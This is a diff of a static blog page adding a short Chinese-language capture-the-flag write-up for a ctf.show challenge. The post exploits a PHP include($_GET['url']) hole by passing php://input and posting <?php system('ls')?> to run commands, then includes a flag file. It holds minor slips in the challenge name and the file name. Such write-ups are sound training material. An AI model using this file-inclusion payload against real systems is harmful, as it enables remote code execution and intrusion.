@@ -69,6 +69,49 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/01/web7/" class="article-date">
+  <time class="dt-published" datetime="2025-02-01T13:42:13.000Z" itemprop="datePublished">2025-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/01/web7/">web7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>ctf show  web3<br>打开题目是<?php include($_GET['url']);?><br>页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数<br>抓包<br>GET &#x2F; HTTP&#x2F;1.1<br>Host: 69322d4c-9dca-4747-8fb4-8431a666f614.challenge.ctf.show<br>Sec-Ch-Ua: “Not&#x2F;A)Brand”;v&#x3D;”8”, “Chromium”;v&#x3D;”126”, “Microsoft Edge”;v&#x3D;”126”<br>Sec-Ch-Ua-Mobile: ?0<br>Sec-Ch-Ua-Platform: “Windows”<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;126.0.0.0 Safari&#x2F;537.36 Edg&#x2F;126.0.0.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Sec-Fetch-Site: same-site<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: <a target="_blank" rel="noopener" href="https://ctf.show/">https://ctf.show/</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6<br>Priority: u&#x3D;0, i<br>Connection: close</p>
+<p>?url&#x3D;php:&#x2F;&#x2F;input        – GET请求的url中拼接伪协议<br><?php system('ls')?>    – post请求内容构造需要执行的代码</p>
+<p>GET &#x2F;?url&#x3D;php:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 194913f5-f320-4d4d-a7af-579bb0974088.challenge.ctf.show<br>Cache-Control: max-age&#x3D;0<br>Sec-Ch-Ua: “Not&#x2F;A)Brand”;v&#x3D;”8”, “Chromium”;v&#x3D;”126”, “Microsoft Edge”;v&#x3D;”126”<br>Sec-Ch-Ua-Mobile: ?0<br>Sec-Ch-Ua-Platform: “Windows”<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;126.0.0.0 Safari&#x2F;537.36 Edg&#x2F;126.0.0.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Sec-Fetch-Site: same-site<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Referer: <a target="_blank" rel="noopener" href="https://ctf.show/">https://ctf.show/</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6<br>Priority: u&#x3D;0, i<br>Connection: close<br>Content-Length: 20</p>
+<?php system('ls')?>
+<p>发现crf_go_go_go index.php,很明显这个crf_go_go_goindex.php文件就是存放flag的文件<br>我们直接在url地址栏中拼接url参数,访问crf_go_go_goindex.php文件<br>?url&#x3D;ctf_go_go_go<br><a target="_blank" rel="noopener" href="https://194913f5-f320-4d4d-a7af-579bb0974088.challenge.ctf.show/?url=ctf_go_go_go">https://194913f5-f320-4d4d-a7af-579bb0974088.challenge.ctf.show/?url=ctf_go_go_go</a><br>得到flag ：ctfshow{ce8d7412-3621-4153-a5e2-c789b68b23e0}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/01/web7/" data-id="cm6mb76bk00002omf090n59jc" data-title="web7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/25/web6/" class="article-date">
@@ -639,7 +682,7 @@ if($_GET[id] == "admin")
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
     </div>
   </div>
 
@@ -650,6 +693,10 @@ if($_GET[id] == "admin")
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/02/01/web7/">web7</a>
+          </li>
         
           <li>
             <a href="/2025/01/25/web6/">web6</a>
@@ -665,10 +712,6 @@ if($_GET[id] == "admin")
         
           <li>
             <a href="/2025/01/18/web3/">web3</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/16/PHP2/">PHP2</a>
           </li>
         
       </ul>
